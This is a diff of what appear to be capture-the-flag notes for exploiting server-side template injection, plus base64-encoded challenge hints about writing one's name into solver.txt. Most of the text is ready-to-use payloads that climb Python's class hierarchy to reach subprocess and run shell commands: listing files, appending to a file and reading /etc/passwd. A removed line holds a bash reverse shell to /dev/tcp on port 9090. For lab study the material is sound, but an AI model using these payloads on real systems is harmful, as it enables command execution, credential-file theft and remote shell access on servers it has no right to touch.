@@ -8,6 +8,17 @@ for i in $(cat class); do
 ((no++))
 done | grep subprocess
 # {{[].__class__.mro()}}
-# {{[].__class__.mro()[1].__subclasses__()[372]}}
-# {{[].__class__.mro()[1].__subclasses__()[372](["ls -lah"],shell=True)}}
-# {{[].__class__.mro()[1].__subclasses__()[372](["bash -i >& /dev/tcp/127.0.0.1/9090 0>&1"],shell=True)}}
+# {{[].__class__.mro()[1].__subclasses__()}}
+# {{[].__class__.mro()[1].__subclasses__()[208]}}
+# {{[].__class__.mro()[1].__subclasses__()[208](["ls -lah"],shell=True)}}
+# {{[].__class__.mro()[1].__subclasses__()[208](["echo 'zetlab' >> solver.txt "],shell=True)}}
+# {{[].__class__.mro()[1].__subclasses__()[208]('/etc/passwd').read() }}
+
+
+SGl0PyAKU29tZSBmdW5jdGlvbnMgaXMganVzdCB0cmFwLiBTbyBiZSBjYXJlZnVsLgpQdXQgeW91ciBuYW1lIGluIHNvbHZlciBsaXN0LiAKSG93PyAKVGhlcmUgaXMgc29sdmVyLnR4dCwgYWxsb3dlZCBjb21tYW5kIGp1c3QgOiBlY2hvICdZb3VyIE5hbWUnID4+IHNvbHZlci50eHQK
+
+SGl0PyAKU29tZSBmdW5jdGlvbnMgaXMganVzdCB0cmFwLiBTbyBiZSBjYXJlZnVsLgpQdXQgeW91ciBuYW1lIGluIHNvbHZlciBsaXN0LiAKSG93PyAKVGhlcmUgaXMgc29sdmVyLnR4dCwgYWxsb3dlZCBjb21tYW5kIGp1c3QgOiBlY2hvICdZb3VyIE5hbWUnID4+IHNvbHZlci50eHQK
+
+
+
+SGl0PyAKU29tZSBmdW5jdGlvbnMgaXMganVzdCB0cmFwLiBTbyBiZSBjYXJlZnVsLgpQdXQgeW91ciBuYW1lIGluIHNvbHZlciBsaXN0LiAKSG93PyAKVGhlcmUgaXMgc29sdmVyLnR4dCwgYWxsb3dlZCBjb21tYW5kIGp1c3QgOiBlY2hvICdZb3VyIE5hbWUnID4+IHNvbHZlci50eHQgCn4gSGludCBub3QganVzdCBoZXJlIH4K
